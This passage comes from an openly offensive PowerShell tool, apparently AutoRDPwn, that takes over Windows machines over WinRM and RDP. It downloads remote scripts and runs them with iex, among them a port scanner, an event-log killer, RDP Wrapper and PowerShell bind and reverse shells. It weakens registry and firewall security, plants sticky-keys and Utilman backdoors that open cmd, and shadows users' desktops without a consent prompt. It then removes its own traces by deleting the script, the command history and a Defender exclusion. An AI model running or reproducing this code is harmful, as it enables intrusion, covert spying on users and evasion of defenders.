        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}

        $Host.UI.RawUI.ForegroundColor = 'Green' ; $networking = $Host.UI.ReadLine() ; Write-Host
        if($networking -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Portscan.ps1" -UseBasicParsing | iex
        Write-host "$txt55" -NoNewLine -ForegroundColor Gray ; $porthost = $Host.UI.ReadLine() ; Write-Host
        Write-host "$txt56" -NoNewLine -ForegroundColor Gray ; $threads = $Host.UI.ReadLine() ; Write-Host
        Write-host "$txt57" -NoNewLine -ForegroundColor Gray ; $topports = $Host.UI.ReadLine() ; $Host.UI.RawUI.ForegroundColor = 'Blue'
        Invoke-Portscan -Hosts $porthost -T $threads -TopPorts $topports ;  $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; pause ; sleep -milliseconds 2500 }

        if($networking -like '2') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt14" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt15" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "3" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt16" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "4" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt20" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}

        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forwarding = $Host.UI.ReadLine() ; Write-Host
        if($forwarding -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
        $lport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $lhost = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rhost = $Host.UI.ReadLine()
        netsh interface portproxy add v4tov4 listenport=$lport listenaddress=$lhost connectport=$rport connectaddress=$rhost ; Write-Host "$txt45" -ForegroundColor Green ; sleep -milliseconds 2500 }

        if($forwarding -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt41" -NoNewLine -ForegroundColor Gray
        $rlport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt42" -NoNewLine -ForegroundColor Gray ; $rlhost = $Host.UI.ReadLine() ; Write-Host
        Write-Host "$txt43" -NoNewLine -ForegroundColor Gray ; $rrport = $Host.UI.ReadLine() ; Write-Host ; Write-Host "$txt44" -NoNewLine -ForegroundColor Gray ; $rrhost = $Host.UI.ReadLine()
        $remoteforward = "true" ; Write-Host ; Write-Host "$txt46" -ForegroundColor Green ; sleep -milliseconds 2500 }

        if($forwarding -like '3') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; $proxy = netsh interface portproxy show all
        if(!$proxy){ Write-Host ; Write-Host "$txt47" -ForegroundColor Red ; sleep -milliseconds 4000 } else { $Host.UI.RawUI.ForegroundColor = 'Gray' ; netsh interface portproxy show all ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }}

        if($forwarding -like '4') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; $proxy = netsh interface portproxy show all
        if(!$proxy){ Write-Host ; Write-Host "$txt47" -ForegroundColor Red ; sleep -milliseconds 4000 } else { netsh interface portproxy reset ; Write-Host "$txt48" -ForegroundColor Red ; sleep -milliseconds 2500 }}

        if($forwarding -like 'X'){ $input = 'x' ; continue }
        if($forwarding -in '1','2','3','4','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}

        if($networking -like '3') { $webserver ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }

        if($networking -like 'X'){ $input = 'x' ; continue }
        if($networking -in '1','2','3','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}
   
        if($module -like '4') { Show-Banner
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "1" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt11" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "2" -NoNewLine -ForegroundColor Green ; Write-Host "] - $txt12" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "M" -NoNewLine -ForegroundColor Blue ; Write-Host "] - $txt22" -ForegroundColor Gray
        Write-Host "[" -NoNewLine -ForegroundColor Gray ; Write-Host "X" -NoNewLine -ForegroundColor Red ; Write-Host "] - $txt2" -ForegroundColor Gray
        Write-Host ; $Random = New-Object System.Random ; $txt8 -split '' | ForEach-Object{Write-Host $_ -nonew ; Start-Sleep -milliseconds $(1 + $Random.Next(25))}
        $Host.UI.RawUI.ForegroundColor = 'Green' ; $forensics = $Host.UI.ReadLine() ; Write-Host

        if($forensics -like '1') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; Write-Host "$txt19" -ForegroundColor Red ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/RDP-Caching.ps1 -UseBasicParsing | iex ; explorer $env:temp\Recovered_RDP_Session
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Progress " " -completed ; pause ; Remove-Item -path $env:temp\Recovered_RDP_Session -Recurse -Force ; sleep -milliseconds 2500 }

        if($forensics -like '2') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray'
        Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/ListAllUsers.ps1 -UseBasicParsing | iex
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; pause ; sleep -milliseconds 2500 }

        if($forensics -like 'X'){ $input = 'x' ; continue }
        if($forensics -in '1','2','m') { $null } else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 2500 }}
        if($module -like '5') { $stickykeys ="true" ; Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500 }

        if($module -like '6') { Write-Host "$txt21" -ForegroundColor Green ; sleep -milliseconds 2500
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-Phant0m.ps1" -UseBasicParsing | iex
        Invoke-Phant0m ; $Host.UI.RawUI.ForegroundColor = 'Green' ; pause ; sleep -milliseconds 2500 }

        if($module -like 'X'){ $input = 'x' ; continue }

	if($module -in '1','2','3','4','5','6','m','x') { $null }
        else { Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}

        'X' { continue }
        default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in '1','2','3','4','5','6','X')

   if($input -in '1','2','3','4','5'){ $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host ; if($hash){ echo "AutoRDPwn" > credentials.dat
   $user = type credentials.dat ; $password = type credentials.dat | ConvertTo-SecureString -AsPlainText -Force ; del credentials.dat }
   $Host.UI.RawUI.ForegroundColor = 'Green' ; winrm quickconfig -quiet ; Set-Item wsman:\localhost\client\trustedhosts * -Force
   Set-NetConnectionProfile -InterfaceAlias "Ethernet*" -NetworkCategory Private ; Set-NetConnectionProfile -InterfaceAlias "Wi-Fi*" -NetworkCategory Private
   Set-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name LocalAccountTokenFilterPolicy -Value 1 -Type DWord 2>&1> $null
   $credential = New-Object System.Management.Automation.PSCredential ( $user, $password ) ; $RDP = New-PSSession -Computer $computer -credential $credential
   $session = get-pssession ; if ($session){

        do { $Host.UI.RawUI.ForegroundColor = 'Green'
	if ($stickykeys){ $input = "control" } else { Write-Host ; Write-Host "$txt29" -NoNewLine -ForegroundColor Gray ; $input = $Host.UI.ReadLine() }
        switch -wildcard ($input) {

        'ver' { $control = "false" ; Write-Host
	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
	Write-Host "$using:txt30" -ForegroundColor Blue }}

        'see' { $control = "false" ; Write-Host
	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 4 /f 2>&1> $null
	Write-Host "$using:txt30" -ForegroundColor Blue }}

        'control*' { $control = "true" ; Write-Host
	invoke-command -session $RDP[0] -scriptblock { REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f 2>&1> $null
	Write-Host "$using:txt31" -ForegroundColor Blue }}

        default { Write-Host ; Write-Host "$txt6" -ForegroundColor Red ; sleep -milliseconds 4000 }}} until ($input -in 'ver','see','controlar','control')

    invoke-command -session $RDP[0] -scriptblock {
    REG ADD "HKLM\SOFTWARE\Microsoft\WBEM\CIMOM" /v AllowAnonymousCallback /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareWks /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v AutoShareServer /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v AllowRemoteRPC /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Remote Assistance" /v fAllowFullControl /t REG_DWORD /d 1 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 1 /f 2>&1> $null }
    Write-Host ; Write-Host "$txt32" -ForegroundColor Blue ; $hostname = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr /I "host" | select -First 1).split(':')[1].trim()}
    Write-Host ; Write-Host "$txt33" -NoNewLine ; Write-Host $hostname.tolower() -ForegroundColor Gray
    $version = invoke-command -session $RDP[0] -scriptblock {(systeminfo | findstr "Microsoft Windows" | select -First 1).split(':')[1].trim()} ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host

    if ($stickykeys){ invoke-command -session $RDP[0] -scriptblock {
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
    REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Utilman.exe" /v Debugger /t REG_SZ /d "cmd /k cmd" /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f 2>&1> $null
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerSettings\7516b95f-f776-4464-8c53-06167f40cc99\8EC4B3A5-6868-48c2-BE75-4F3044BE88A7" /v Attributes /t REG_DWORD /d 1 /f 2>&1> $null }}

        if($version -Like '*Server*') { Write-Host "$version $txt34" -ForegroundColor Red
        invoke-command -session $RDP[0] -scriptblock { $Host.UI.RawUI.ForegroundColor = 'Green'
        (Get-WmiObject -class Win32_TSGeneralSetting -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0) 2>&1> $null
        Write-Host ; Write-Host "$using:txt35" -ForegroundColor Blue ; Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; query session }
        $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt36" -NoNewLine -ForegroundColor Gray ; $shadow = $Host.UI.ReadLine()
        if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
        else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

        else { Write-Host "$version $txt37" -ForegroundColor Red
        invoke-command -session $RDP[0] -scriptblock {
        add-type @"
        using System.Net;
        using System.Security.Cryptography.X509Certificates;
        public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
        ServicePoint srvPoint, X509Certificate certificate,
        WebRequest request, int certificateProblem) { return true; }}
"@;     $AllProtocols = [System.Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'
        [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols
        [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy }

    invoke-command -session $RDP[0] -scriptblock {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-RDPwrap.ps1" -UseBasicParsing | iex
    msiexec /i "RDPWInst-v1.6.2.msi" /quiet /qn /norestart ; netsh advfirewall firewall delete rule name="$using:Pwn6" 2>&1> $null
    netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=udp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
    netsh advfirewall firewall add rule name="$using:Pwn6" dir=in protocol=tcp action=allow program="C:\Windows\System32\rdpsa.exe" enable=yes 2>&1> $null
    attrib +h 'C:\Program Files\RDP Wrapper' 2>&1> $null ; attrib +h 'C:\Program Files (x86)\RDP Wrapper' 2>&1> $null ; sleep -milliseconds 7500 ; rm .\RDPWInst-v1.6.2.msi 2>&1> $null }

    $shadow = invoke-command -session $RDP[0] -scriptblock {(Get-Process explorer | Select-Object SessionId | Format-List | findstr "Id" | select -First 1).split(':')[1].trim()}
    $Host.UI.RawUI.ForegroundColor = 'Green' ; Write-Host ; Write-Host "$txt35" -ForegroundColor Blue ; sleep -milliseconds 2500
    if($control -eq 'true') { if($stickykeys){ mstsc /v $computer /admin /f } else { mstsc /v $computer /admin /shadow:$shadow /control /noconsentprompt /prompt /f }}
    else { mstsc /v $computer /admin /shadow:$shadow /noconsentprompt /prompt /f }}

if ($hash){ invoke-command -session $RDP[0] -scriptblock {
$script = 'net user AutoRDPwn /delete ; cmd /c rmdir /q /s C:\Users\AutoRDPwn ; Unregister-ScheduledTask -TaskName AutoRDPwn -Confirm:$false ; $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript'
echo $script > $env:TEMP\script.ps1 ; $file = "$env:TEMP\script.ps1"
$action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolicy ByPass -NoProfile -WindowStyle Hidden $file" ; $time = (Get-Date).AddHours(+2) ; $trigger =  New-ScheduledTaskTrigger -Once -At $time
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}

Write-Host ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host $txt38  -ForegroundColor Red ; sleep -milliseconds 4000
if ($webserver){ invoke-command -session $RDP[0] -scriptblock { netsh advfirewall firewall delete rule name="Powershell Webserver" 2>&1> $null
netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=8080 2>&1> $null ; Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "Powershell Web Server -->` " -NoNewLine -ForegroundColor Green ; Write-Host http://$using:computer`:8080 -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; sleep -milliseconds 7500
start powershell { Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex }}}

if ($netcat -in 'local'){ invoke-command -session $RDP[0] -scriptblock { Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "$using:txt51 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc $using:computer $using:ncport" -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1" -UseBasicParsing | iex ; Invoke-PowerShellTcp -Bind -Port $using:ncport }}

if ($netcat -in 'remote'){ invoke-command -session $RDP[0] -scriptblock { Write-Host
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray
Write-Host "$using:txt52 -->` " -NoNewLine -ForegroundColor Green ; Write-Host "nc -l $using:ncport" -ForegroundColor Blue
Write-Host "----------------------------------------------------------------------" -ForegroundColor Gray ; Write-Host
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Invoke-PowerShellTcp.ps1" -UseBasicParsing | iex ; Invoke-PowerShellTcp -Reverse -IPAddress $using:ipadress -Port $using:ncport }}

if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
else { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }} if($tsfail) { Write-Host ; Write-Host "$txt40" -ForegroundColor Red ; sleep -milliseconds 4000 }}
$PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript ; del (Get-PSReadlineOption).HistorySavePath ; Remove-MpPreference -ExclusionExtension ".exe" 2>&1> $null
